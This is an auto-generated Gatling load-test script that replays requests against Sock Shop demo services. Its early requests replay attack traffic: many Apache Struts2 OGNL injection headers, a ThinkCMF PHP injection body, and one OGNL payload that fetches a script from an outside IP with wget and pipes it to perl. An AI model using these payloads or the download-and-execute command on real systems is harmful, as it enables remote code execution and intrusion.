// generated automatically by Taurus

import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

class Simulation_refael_up9_demo_link extends Simulation {
  val concurrency = Integer.getInteger("concurrency", 1).toInt
  val rampUpTime = Integer.getInteger("ramp-up", 0).toInt
  val holdForTime = Integer.getInteger("hold-for", 0).toInt
  val throughput = Integer.getInteger("throughput")
  val iterationLimit = Integer.getInteger("iterations")

  val durationLimit = rampUpTime + holdForTime

  var httpConf = http.baseUrl("")

  var testScenario = scenario("Taurus Scenario")

  var execution = exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "application/json")
      .body(StringBody("""{"a": "fetch", "content": "<php>die(@md5(HelloThinkCMF))</php>"}"""))
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X30mknbA'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "application/x-www-form-urlencoded")
  ).exec(
    http("${front_end_sock_shop}/").head("http://${front_end_sock_shop}/")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('x4KNnCMm'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xVSERkYM'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('tMeGL0pH'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Uhk9c9CM'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('qieoAZ6u'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uUVc2U8M'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('liape4t0'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uuurxrfw'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jyu8xkii'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://209.90.79.141/pdf/s.pdf | perl")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('dyi8d0Jw'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "text/html")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jycf9lqq'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('pkpxommw'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('zUn5ygGk'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('hnBSMl1i'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('o4einzpi'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('rfi8x4t9'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "text/plain")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('VEh255IZ'")
  ).exec(
    http("${front_end_sock_shop}/").get("http://${front_end_sock_shop}/")
      .header("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('b1ko6ejb'")
  ).exec(
    http("${front_end_sock_shop}/basket.html").get("http://${front_end_sock_shop}/basket.html")
      .header("amp-cache-transform", "google;v="1..8"")
  ).exec(
    http("${front_end_sock_shop}/cards").post("http://${front_end_sock_shop}/cards")
      .header("x-requested-with", "XMLHttpRequest")
      .header("Content-Type", "application/json")
      .body(StringBody("""{
 "ccv": "123",
 "expires": "12/34",
 "longNum": "4111111111111111"
}"""))
  ).exec(
    http("${front_end_sock_shop}/cart/update").post("http://${front_end_sock_shop}/cart/update")
      .header("x-requested-with", "XMLHttpRequest")
      .header("Content-Type", "application/json")
      .body(StringBody("""{
 "id": "03fef6ac-1896-4ce8-bd69-b798f85c6e0b",
 "quantity": "1"
}"""))
  ).exec(
    http("${carts_sock_shop}/carts/xGsbdrPaoqfokjGLQgckj33LqFFZhSTL/items").get("http://${carts_sock_shop}/carts/xGsbdrPaoqfokjGLQgckj33LqFFZhSTL/items")
  ).exec(
    http("${front_end_sock_shop}/catalogue").get("http://${front_end_sock_shop}/catalogue")
      .header("x-requested-with", "XMLHttpRequest")
      .formParam("size", "5")
  ).exec(
    http("${front_end_sock_shop}/catalogue/size").get("http://${front_end_sock_shop}/catalogue/size")
      .header("x-requested-with", "XMLHttpRequest")
      .formParam("tags", "")
  ).exec(
    http("${front_end_sock_shop}/category.html").get("http://${front_end_sock_shop}/category.html")
  ).exec(
    http("${front_end_sock_shop}/customer-orders.html").get("http://${front_end_sock_shop}/customer-orders.html")
      .header("postman-token", "ec81d93d-c901-406c-b327-7377fba3daed")
      .header("amp-cache-transform", "google;v="1..8"")
  ).exec(
    http("${user_sock_shop}/customers").get("http://${user_sock_shop}/customers")
  ).exec(
    http("${front_end_sock_shop}/customers").get("http://${front_end_sock_shop}/customers")
      .header("postman-token", "dd2d19c1-4f94-4540-ae71-e4ad31e30e7b")
      .header("x-requested-with", "XMLHttpRequest")
  ).exec(
    http("${front_end_sock_shop}/footer.html").get("http://${front_end_sock_shop}/footer.html")
      .header("x-requested-with", "XMLHttpRequest")
  ).exec(
    http("${front_end_sock_shop}/index.html").get("http://${front_end_sock_shop}/index.html")
      .header("postman-token", "f8fb8602-2a13-4807-b91b-32a99547bf5e")
      .header("amp-cache-transform", "google;v="1..8"")
      .formParam("findcli", "-1")
  ).exec(
    http("${front_end_sock_shop}/ipinfo.io").get("http://${front_end_sock_shop}/ipinfo.io")
  ).exec(
    http("${front_end_sock_shop}/tags").get("http://${front_end_sock_shop}/tags")
      .header("x-requested-with", "XMLHttpRequest")
  ).exec(
    http("${front_end_sock_shop}/tags").get("http://${front_end_sock_shop}/tags")
      .header("x-requested-with", "XMLHttpRequest")
      .header("postman-token", "e6e35f10-d44d-4297-aef8-2b9c2d47747d")
      .header("amp-cache-transform", "google;v="1..8"")
  ).exec(
    http("${front_end_sock_shop}/topbar.html").get("http://${front_end_sock_shop}/topbar.html")
      .header("x-requested-with", "XMLHttpRequest")
  ).exec(
    http("${front_end_sock_shop}/www.99syn.com/index.html").get("http://${front_end_sock_shop}/www.99syn.com/index.html")
  )

  if (iterationLimit == null)
    testScenario = testScenario.forever{execution}
  else
    testScenario = testScenario.repeat(iterationLimit.toInt){execution}

  val virtualUsers =
    if (rampUpTime > 0)
      rampUsers(concurrency) during (rampUpTime seconds)
    else
      atOnceUsers(concurrency)

  var testSetup = setUp(testScenario.inject(virtualUsers).protocols(httpConf))

  if (throughput != null)
    testSetup = testSetup.throttle(
      reachRps(throughput) in (rampUpTime),
      holdFor(Int.MaxValue)
    )

  if (durationLimit > 0)
    testSetup.maxDuration(durationLimit)
}
